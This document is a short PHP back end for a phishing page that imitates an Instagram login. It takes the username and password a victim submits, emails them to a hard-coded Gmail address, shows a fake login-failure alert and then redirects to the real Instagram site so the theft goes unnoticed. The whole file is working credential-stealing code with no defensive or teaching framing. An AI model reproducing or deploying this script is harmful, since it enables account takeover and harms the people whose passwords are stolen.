<?php


$username = $_POST['u_name'];  
 $passcode = $_POST['pass'];  
 $subject = "Someone Login ! Insta Dummy page";
 $to ="asmios200@gmail.com";
 
 $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; 
 



if (empty($username)|| empty($passcode)){ 
echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
    window.history.go(-1);
    </script>";
}
else 
{ 
    mail($to,$subject,$txt); 
    echo"<script type='text/javascript'>alert('Sorry ! unable to login ');
     // Simulate an HTTP redirect:
    window.location.replace('http://www.instagram.com');
    </script>";
}


?>